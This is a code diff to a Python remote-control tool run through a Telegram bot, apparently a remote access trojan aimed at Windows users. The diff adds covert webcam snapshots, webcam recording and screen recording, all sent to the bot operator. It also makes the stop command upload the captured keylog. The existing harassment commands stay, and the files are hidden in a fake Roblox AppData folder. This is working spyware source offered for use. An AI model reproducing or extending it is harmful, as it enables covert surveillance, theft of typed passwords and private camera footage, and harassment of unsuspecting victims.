@@ -20,7 +20,9 @@ from pycaw.pycaw import AudioUtilities, IAudioEndpointVolume
 from comtypes import CLSCTX_ALL, CoInitialize, CoUninitialize
 import pygame
 from pynput import keyboard
+import cv2
 import pyperclip
+import numpy as np
 
 username = getpass.getuser()
 
@@ -119,17 +121,248 @@ def create_keyboard():
         types.KeyboardButton("/shutdown"),
         types.KeyboardButton("/start_listening"),
         types.KeyboardButton("/stop_listening"),
-        types.KeyboardButton("/send_keylog"),
         types.KeyboardButton("/screamer"),
         types.KeyboardButton("/stop_screamer"),
         types.KeyboardButton("/open_text"),
         types.KeyboardButton("/close_text"),
+        types.KeyboardButton("/open_video"),
+        types.KeyboardButton("/close_video"),
+        types.KeyboardButton("/start_recording"),
+        types.KeyboardButton("/stop_recording"),
+        types.KeyboardButton("/start_recording_cam"),
+        types.KeyboardButton("/stop_recording_cam"),
+        types.KeyboardButton("/screen_cam"),
     )
     return keyboard
+
+save_dir = rf"C:\Users\{username}\AppData\Local\Roblox\Videos"
+output_file1 = "webcam_record.avi"
+output_path1 = os.path.join(save_dir, output_file1)
+
+save_dir_img = rf"C:\Users\{username}\AppData\Local\Roblox\Images"
+os.makedirs(save_dir_img, exist_ok=True)
+output_file2 = "cam.png"
+output_path2 = os.path.join(save_dir_img, output_file2)
+
+os.makedirs(save_dir_img, exist_ok=True)
+
+os.makedirs(save_dir, exist_ok=True)
+fps = 20
+stop_recording_cam = True
+
+def get_webcam(): 
+    try:
+        cap = cv2.VideoCapture(0)
+        ret, frame = cap.read()
+        if ret:
+            cv2.imwrite(output_path2, frame)
+        cap.release()
+    
+    except Exception as e:
+        pass
+
+@bot.message_handler(commands=['screen_cam'])
+def get_webcam_screen(message):
+    try:
+        get_webcam()
+        with open(output_path2, 'rb') as screen:
+            bot.send_photo(message.chat.id, screen, reply_markup=create_keyboard())
+        os.remove(output_path2)
+    except Exception as e:
+        bot.reply_to(message, f"Error when taking a screenshot of the camera: {str(e)}", reply_markup=create_keyboard())
+
+def webcam_record():
+    global stop_recording_cam
+    cap = cv2.VideoCapture(0)
+
+    frame_width = int(cap.get(cv2.CAP_PROP_FRAME_WIDTH))
+    frame_height = int(cap.get(cv2.CAP_PROP_FRAME_HEIGHT))
+    fourcc = cv2.VideoWriter_fourcc(*"XVID")
+    out = cv2.VideoWriter(output_path1, fourcc, fps, (frame_width, frame_height))
+
+    try:
+        while not stop_recording_cam:
+            ret, frame = cap.read()
+            if not ret:
+                break
+
+            out.write(frame)
+            if cv2.waitKey(1) & 0xFF == ord('q'):
+                stop_recording_cam = True
+                break
+    except Exception as e:
+        pass
+    finally:
+        cap.release()
+        out.release()
+        cv2.destroyAllWindows()
+
+@bot.message_handler(commands=['start_recording_cam'])
+def start_webcam_record(message):
+    global stop_recording_cam
+    try:
+        if not stop_recording_cam:
+            bot.send_message(message.chat.id, "The screen is already recording", reply_markup=create_keyboard())
+            return
+        
+        stop_recording_cam = False
+        threading.Thread(target=webcam_record).start()
+        bot.send_message(message.chat.id, "Webcam recording started", reply_markup=create_keyboard())
+    except Exception as e:
+        bot.reply_to(message, f"Error when starting recording: {str(e)}", reply_markup=create_keyboard())
+
+@bot.message_handler(commands=['stop_recording_cam'])
+def stop_webcam_record(message):
+    global stop_recording_cam
+    try:
+        if stop_recording_cam:
+            bot.send_message(message.chat.id, "Webcam recording is already stopped", reply_markup=create_keyboard())
+            return
+
+        stop_recording_cam = True
+        bot.send_message(message.chat.id, f"Webcam recording stopped. Video saved at:\n{output_path}", reply_markup=create_keyboard())
+        if not os.path.exists(output_path1):
+            bot.reply_to(message, "No video was found. Make sure you record the screen", reply_markup=create_keyboard())
+            return
+
+        with open(output_path1, 'rb') as video_file:
+            bot.send_video(message.chat.id, video_file, caption="Here's your recorded video", reply_markup=create_keyboard())
+        os.remove(output_path1)
+    except Exception as e:
+        bot.reply_to(message, f"Error when stopping recording: {str(e)}", reply_markup=create_keyboard())
+
+last_video_path = None
+video_thread = None
+stop_video_flag = False
+
+output_file = "screen_record.avi"
+output_path = os.path.join(save_dir, output_file)
+
+screen_size = pyautogui.size()
+stop_recording = True
+
+def screen_record():
+    global stop_recording
+    fourcc = cv2.VideoWriter_fourcc(*"XVID")
+    out = cv2.VideoWriter(output_path, fourcc, fps, screen_size)
+
+    try:
+        while not stop_recording:
+            img = pyautogui.screenshot()
+            frame = np.array(img)
+            frame = cv2.cvtColor(frame, cv2.COLOR_RGB2BGR)
+            out.write(frame)
+    except Exception as e:
+        pass
+    finally:
+        out.release()
+        cv2.destroyAllWindows()
+
+@bot.message_handler(commands=['start_recording'])
+def start_recording(message):
+    global stop_recording
+    try:
+        if not stop_recording:
+            bot.send_message(message.chat.id, "The screen is already recording", reply_markup=create_keyboard())
+            return
+        
+        stop_recording = False
+        threading.Thread(target=screen_record).start()
+        bot.send_message(message.chat.id, "Screen recording started", reply_markup=create_keyboard())
+    except Exception as e:
+        bot.reply_to(message, f"Error when starting the recording: {str(e)}", reply_markup=create_keyboard())
+
+@bot.message_handler(commands=['stop_recording'])
+def stop_recording_handler(message):
+    global stop_recording
+    try:
+        if stop_recording:
+            bot.send_message(message.chat.id, "Screen recording is already stopped", reply_markup=create_keyboard())
+            return
+        
+        stop_recording = True
+        bot.send_message(message.chat.id, f"Screen recording stopped. Video saved at:\n{output_path}", reply_markup=create_keyboard())
+        if not os.path.exists(output_path):
+            bot.reply_to(message, "No video was found. Make sure you record the screen", reply_markup=create_keyboard())
+            return
+
+        with open(output_path, 'rb') as video_file:
+            bot.send_video(message.chat.id, video_file, caption="Here's your recorded video", reply_markup=create_keyboard())
+        os.remove(output_path)
+    except Exception as e:
+        bot.reply_to(message, f"Error when stopping recording: {str(e)}", reply_markup=create_keyboard())
+
+def play_video(video_path):
+    global stop_video_flag
+    cap = cv2.VideoCapture(video_path)
+    cv2.namedWindow("Video", cv2.WND_PROP_FULLSCREEN)
+    cv2.setWindowProperty("Video", cv2.WND_PROP_FULLSCREEN, cv2.WINDOW_FULLSCREEN)
+    
+    fps = cap.get(cv2.CAP_PROP_FPS)
+    delay = int(1000 / fps) if fps > 0 else 33
+
+    while cap.isOpened():
+        ret, frame = cap.read()
+        if not ret or stop_video_flag:
+            break
+        cv2.imshow("Video", frame)
+        if cv2.waitKey(delay):
+            break
+    
+    cap.release()
+    cv2.destroyAllWindows()
+    stop_video_flag = False
+
+@bot.message_handler(content_types=['video'])
+def handle_video(message):
+    global last_video_path
+    try:
+        video_info = bot.get_file(message.video.file_id)
+        video_path = video_info.file_path
+        file_name = f"{message.video.file_id}.mp4"
+        save_file_path = os.path.join(save_dir, file_name)
+
+        downloaded_file = bot.download_file(video_path)
+        
+        with open(save_file_path, "wb") as new_file:
+            new_file.write(downloaded_file)
+        
+        last_video_path = save_file_path
+        bot.reply_to(message, f"The video is saved in {save_file_path}. Use /open_video to open", reply_markup=create_keyboard())
+    except Exception as e:
+        bot.reply_to(message, f"Error: {str(e)}", reply_markup=create_keyboard())
+
+@bot.message_handler(commands=['open_video'])
+def open_video(message):
+    global video_thread, stop_video_flag, last_video_path
+    try:
+        if last_video_path is None or not os.path.exists(last_video_path):
+            bot.reply_to(message, "There is no available video to open", reply_markup=create_keyboard())
+            return
+        
+        if video_thread and video_thread.is_alive():
+            bot.reply_to(message, "The video is already playing", reply_markup=create_keyboard())
+            return
+        
+        set_volume()
+        stop_video_flag = False
+        video_thread = threading.Thread(target=play_video, args=(last_video_path,))
+        video_thread.start()
+        bot.reply_to(message, "The video is open", reply_markup=create_keyboard())
+    except Exception as e:
+        bot.reply_to(message, f"Error when opening a video: {str(e)}", reply_markup=create_keyboard())
+
+@bot.message_handler(commands=['close_video'])
+def close_video(message):
+    global stop_video_flag
+    try:
+        stop_video_flag = True
+        bot.reply_to(message, "Video's closed", reply_markup=create_keyboard())
+    except Exception as e:
+        bot.reply_to(message, f"Error when closing the video: {str(e)}", reply_markup=create_keyboard())
+
     
 image_path = rf"C:\Users\{username}\AppData\Local\Roblox\Images\temp_image.jpg"
-save_dir = rf"C:\Users\{username}\AppData\Local\Roblox\Images"
-os.makedirs(save_dir, exist_ok=True)
 screen_thread = None
 root = None
 root1 = None
@@ -213,7 +446,7 @@ def open_text(message):
         
         set_volume()
         pygame.init()
-        song = pygame.mixer.Sound(rf'C:\Users\{username}\AppData\Local\Roblox\Musics\muski.mp3', reply_markup=create_keyboard())
+        song = pygame.mixer.Sound(rf'C:\Users\{username}\AppData\Local\Roblox\Musics\muski.mp3')
         song.play()
         time.sleep(song.get_length())
         pygame.quit()
@@ -244,7 +477,7 @@ def handle_photo(message):
         with open(image_path, 'wb') as file:
             file.write(downloaded_file)
 
-        final_save_path = os.path.join(save_dir, f"image_{int(time.time())}.jpg")
+        final_save_path = os.path.join(save_dir_img, f"image_{int(time.time())}.jpg")
         with open(final_save_path, 'wb') as file:
             file.write(downloaded_file)
 
@@ -288,7 +521,7 @@ def stop_screen_command(message):
         stop_screen()
         bot.send_message(message.chat.id, "Screen display stopped", reply_markup=create_keyboard())
     except Exception as e:
-        bot.send_message(message.chat.id, f"Error: {e}")
+        bot.send_message(message.chat.id, f"Error: {e}", reply_markup=create_keyboard())
 
 KEYLOG_FILE = rf'C:\Users\{username}\AppData\Local\keylog.txt'
 
@@ -326,35 +559,29 @@ def start_listening(message):
     global listening
     try:
         if listening:
-            bot.send_message(message.chat.id, "listening already started")
+            bot.send_message(message.chat.id, "listening already started", reply_markup=create_keyboard())
             return
         start_keylogger()
-        bot.send_message(message.chat.id, "Started listening to keyboard events")
+        bot.send_message(message.chat.id, "Started listening to keyboard events", reply_markup=create_keyboard())
     except Exception as e:
-        bot.send_message(message.chat.id, f"Error: {e}")
+        bot.send_message(message.chat.id, f"Error: {e}", reply_markup=create_keyboard())
 
 @bot.message_handler(commands=['stop_listening'])
 def stop_listening(message):
     global listening
     try:
         if not listening:
-            bot.send_message(message.chat.id, "listening already stopped")
+            bot.send_message(message.chat.id, "listening already stopped", reply_markup=create_keyboard())
             return
         stop_keylogger()
-        bot.send_message(message.chat.id, "Stopped listening to keyboard events")
-    except Exception as e:
-        bot.send_message(message.chat.id, f"Error: {e}")
-
-@bot.message_handler(commands=['send_keylog'])
-def send_keylog(message):
-    try:
+        bot.send_message(message.chat.id, "Stopped listening to keyboard events", reply_markup=create_keyboard())
         if os.path.exists(KEYLOG_FILE):
             with open(KEYLOG_FILE, 'rb') as file:
                 bot.send_document(message.chat.id, file)
         else:
-            bot.send_message(message.chat.id, "No keylog file found")
+            bot.send_message(message.chat.id, "No keylog file found", reply_markup=create_keyboard())
     except Exception as e:
-        bot.send_message(message.chat.id, f"Error: {e}")
+        bot.send_message(message.chat.id, f"Error: {e}", reply_markup=create_keyboard())
 
 @bot.message_handler(commands=['buffer'])
 def unblock_keys(message):
@@ -786,7 +1013,7 @@ def take_screenshot(message):
         screen_path = os.path.join(os.getenv('APPDATA'), f'Screenshot_{1}.jpg')
         ImageGrab.grab().save(screen_path)
         with open(screen_path, 'rb') as screen:
-            bot.send_photo(message.chat.id, screen)
+            bot.send_photo(message.chat.id, screen, reply_markup=create_keyboard())
         os.remove(screen_path)
     except Exception as e:
         bot.send_message(message.chat.id, f"Error: {e}", reply_markup=create_keyboard())
@@ -846,7 +1073,7 @@ def kill_explorer():
 def explorer_spam(message):
     try:
         if spam_running:
-            bot.send_message(message.chat.id, "explorer_spam is already running")
+            bot.send_message(message.chat.id, "explorer_spam is already running", reply_markup=create_keyboard())
             return
         threading.Thread(target=open_explorer, daemon=True).start()
         bot.send_message(message.chat.id, f"Explorer spam executed", reply_markup=create_keyboard())
@@ -857,7 +1084,7 @@ def explorer_spam(message):
 def stop_explorer_spam(message):
     try:
         if not spam_running:
-            bot.send_message(message.chat.id, "explorer_spam is already stopped")
+            bot.send_message(message.chat.id, "explorer_spam is already stopped", reply_markup=create_keyboard())
             return
         kill_explorer()
         bot.send_message(message.chat.id, f"Stopped Explorer spam", reply_markup=create_keyboard())
